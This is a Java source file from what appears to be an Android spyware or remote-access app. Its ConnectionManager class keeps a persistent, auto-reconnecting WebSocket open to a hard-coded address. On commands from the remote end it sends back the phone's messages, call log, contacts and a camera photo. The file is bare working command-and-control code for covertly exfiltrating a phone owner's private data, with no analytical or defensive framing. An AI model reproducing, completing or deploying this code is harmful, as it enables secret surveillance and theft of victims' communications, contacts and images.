package tosatto.simonepio;

import android.content.Context;
import android.util.Log;

import java.net.URI;
import java.net.URISyntaxException;

import tech.gusavila92.websocketclient.WebSocketClient;

public class ConnectionManager {
    public static Context context;
    private static WebSocketClient webSocketClient;

    public static void startAsync(Context con)
    {
        try {
           context = con;
           Log.i("WebSocket", "PROVO A CONNETTERMI");
           connect();
        }catch (Exception ex){
            startAsync(con);
        }
    }

    private static void connect() {
        URI uri;
        try {
            // Connect to local host
            uri = new URI("ws://192.168.43.244:8080");
        }
        catch (URISyntaxException e) {
            e.printStackTrace();
            return;
        }
        webSocketClient = new WebSocketClient(uri) {
            @Override
            public void onOpen() {
                Log.i("WebSocket", "Session is starting");
                //webSocketClient.send("Hello World!");
            }
            @Override
            public void onTextReceived(String s) {
                Log.i("WebSocket", "Message received:");
                String message = s;
                Log.i("WebSocket", message);
                switch (s){
                    case "msg":
                        CommandClass.sendMsgLog(context, webSocketClient);
                        break;
                    case "calls":
                        CommandClass.sendCalls(context.getContentResolver(), webSocketClient);
                        break;
                    case "contacts":
                        CommandClass.sendContacts(context.getContentResolver(), webSocketClient);
                        break;
                    case "camera":
                        CommandClass.sendCameraPhoto(context.getContentResolver(), webSocketClient);
                        break;
                }
            }
            @Override
            public void onBinaryReceived(byte[] data) {
            }
            @Override
            public void onPingReceived(byte[] data) {
            }
            @Override
            public void onPongReceived(byte[] data) {
            }
            @Override
            public void onException(Exception e) {
                System.out.println(e.getMessage());
            }
            @Override
            public void onCloseReceived() {
                Log.i("WebSocket", "Closed ");
                System.out.println("onCloseReceived");
            }
        };
        webSocketClient.setConnectTimeout(10000);
        webSocketClient.setReadTimeout(60000);
        webSocketClient.enableAutomaticReconnection(5000);
        webSocketClient.connect();
    }
}